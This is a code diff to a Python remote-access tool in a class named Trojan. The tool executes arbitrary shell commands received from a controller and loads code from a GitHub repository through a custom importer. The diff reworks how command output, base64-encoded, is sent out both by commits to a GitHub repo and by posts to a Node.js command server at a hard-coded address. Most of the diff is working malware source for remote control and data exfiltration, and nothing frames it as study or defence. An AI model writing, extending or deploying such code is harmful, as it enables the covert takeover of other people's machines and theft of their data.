@@ -73,12 +73,17 @@ class Trojan:
                 shell_command = command.get('command')
                 if shell_command:
                     try:
+                        print(f"[*] Executing command: {shell_command}")
                         result = subprocess.check_output(shell_command, shell=True, stderr=subprocess.STDOUT)
                         result = result.decode('utf-8')
                     except subprocess.CalledProcessError as e:
                         result = e.output.decode('utf-8')
-                    self.send_command_result(shell_command, result)
+                    
+                    # Save the result to GitHub
                     self.store_command_result(shell_command, result)
+
+                    # Send the result to the Node.js server
+                    self.send_command_result(shell_command, result)
             elif command_type == 'module':
                 module_name = command.get('module')
                 if module_name:
@@ -86,18 +91,21 @@ class Trojan:
                         importlib.import_module(module_name)
                     thread = threading.Thread(target=self.module_runner, args=(module_name,))
                     thread.start()
-            elif command_type == 'c_module':
-                c_module_name = command.get('module')
-                if c_module_name:
-                    try:
-                        result = subprocess.check_output(f'./{c_module_name}', shell=True, stderr=subprocess.STDOUT)
-                        result = result.decode('utf-8')
-                    except subprocess.CalledProcessError as e:
-                        result = e.output.decode('utf-8')
-                    self.send_command_result(c_module_name, result)
-                    self.store_command_result(c_module_name, result)
         else:
             print(f"Invalid command format: {command}")
+
+    def store_command_result(self, command, result):
+        timestamp = datetime.now().isoformat()
+        file_name = f"{timestamp}_shell_command.txt"
+        file_content = f"Command: {command}\n\nResult:\n{result}"
+        
+        # Encode the content to base64
+        bindata = base64.b64encode(file_content.encode('utf-8'))
+
+        # Save the file to the data folder in GitHub
+        remote_path = f'data/{self.id}/{file_name}'
+        commit_message = f"Saving output of shell command: {command}"
+        self.repo.create_file(remote_path, commit_message, bindata)
 
     def module_runner(self, module):
         result = sys.modules[module].run()
@@ -107,12 +115,6 @@ class Trojan:
         message = datetime.now().isoformat()
         remote_path = f'data/{self.id}/{message}.data'
         bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
-        self.repo.create_file(remote_path, message, bindata)
-
-    def store_command_result(self, command, result):
-        message = datetime.now().isoformat()
-        remote_path = f'data/{self.id}/{message}.data'
-        bindata = base64.b64encode(bytes(f'Command: {command}\nResult:\n{result}', 'utf-8'))
         self.repo.create_file(remote_path, message, bindata)
 
     def run(self):
@@ -155,7 +157,7 @@ class GitImporter:
 
 if __name__ == '__main__':
     sys.meta_path.append(GitImporter())
-    NODE_SERVER_URL = "http://10.0.100.100:3000"
+    NODE_SERVER_URL = "http://10.0.100.100:3000"  # Change this to your Node.js server URL
     trojan = Trojan('abc', NODE_SERVER_URL)
     trojan.run()
 
